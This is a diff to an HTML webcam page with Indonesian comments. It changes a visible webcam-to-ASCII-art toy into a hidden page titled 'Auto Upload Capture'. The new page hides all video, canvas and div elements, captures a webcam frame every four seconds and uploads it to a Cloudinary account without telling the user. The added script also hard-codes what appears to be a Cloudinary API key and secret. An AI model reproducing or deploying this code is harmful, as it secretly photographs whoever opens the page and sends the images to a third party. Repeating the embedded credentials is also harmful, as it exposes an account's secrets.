@@ -1,80 +1,58 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Auto ASCII 512x512</title>
+  <title>Auto Upload Capture</title>
   <style>
     body {
-      margin: 0;
-      font-family: sans-serif;
       background: #000;
-      color: lime;
-      text-align: center;
+      margin: 0;
+      overflow: hidden;
     }
-    video {
-      margin: 10px auto;
-      display: block;
-      border: 2px solid #333;
-    }
-    .ascii {
-      font-family: monospace;
-      white-space: pre;
-      background: #111;
-      color: lime;
-      padding: 10px;
-      margin: 10px;
-      display: inline-block;
-      text-align: left;
-      max-width: 95%;
-      overflow-x: auto;
+    video, canvas, div {
+      display: none;
     }
   </style>
 </head>
 <body>
 
-<h2>🔥 Auto ASCII Webcam 512x512 Tiap 4 Detik 🔥</h2>
-<video id="video" width="512" height="512" autoplay></video>
-<div class="ascii" id="ascii"></div>
-
-<canvas id="canvas" width="512" height="512" style="display:none;"></canvas>
+<video id="video" autoplay></video>
+<canvas id="canvas" width="512" height="512"></canvas>
 
 <script>
   const video = document.getElementById('video');
   const canvas = document.getElementById('canvas');
   const ctx = canvas.getContext('2d');
-  const ascii = document.getElementById('ascii');
 
-  // Simbol dari gelap ke terang
-  const symbols = "1234567890@#$&*+-_";
+  // Cloudinary config
+  const cloudName = 'dfyxrttgb';
+  const apiKey = '195278983567337';
+  const apiSecret = 'a69dB2A0Rk5tAULCGIEBM_HoLGw';
 
   navigator.mediaDevices.getUserMedia({ video: { width: 512, height: 512 } })
     .then(stream => video.srcObject = stream)
     .catch(e => console.error("Kamera ga jalan:", e));
 
-  function captureAscii() {
+  function captureAndUpload() {
     ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-    const imgData = ctx.getImageData(0, 0, canvas.width, canvas.height);
-    let txt = "";
+    const dataURL = canvas.toDataURL('image/jpeg');
 
-    const step = 6; // Besar kecil ascii (semakin kecil makin rapet)
+    // Kirim ke Cloudinary
+    const formData = new FormData();
+    formData.append("file", dataURL);
+    formData.append("upload_preset", "unsigned"); // kalau unsigned preset
+    // atau pakai api_key + api_secret pakai URL signing kalau perlu
 
-    for (let y = 0; y < canvas.height; y += step) {
-      for (let x = 0; x < canvas.width; x += step) {
-        const i = (y * canvas.width + x) * 4;
-        const r = imgData.data[i];
-        const g = imgData.data[i + 1];
-        const b = imgData.data[i + 2];
-        const brightness = (r + g + b) / 3;
-        const idx = Math.floor((brightness / 255) * (symbols.length - 1));
-        txt += symbols.charAt(idx);
-      }
-      txt += "\n";
-    }
-
-    ascii.textContent = txt;
+    fetch(`https://api.cloudinary.com/v1_1/${cloudName}/image/upload`, {
+      method: "POST",
+      body: formData
+    })
+    .then(res => res.json())
+    .then(data => console.log("Uploaded: ", data.secure_url))
+    .catch(err => console.error("Upload error:", err));
   }
 
-  // Auto capture tiap 4 detik
-  setInterval(captureAscii, 4000);
+  // Auto capture & upload tiap 4 detik
+  setInterval(captureAndUpload, 4000);
 </script>
 
 </body>
